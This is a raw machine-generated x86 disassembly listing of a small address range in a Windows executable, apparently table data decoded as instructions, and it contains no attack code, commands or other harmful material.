  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
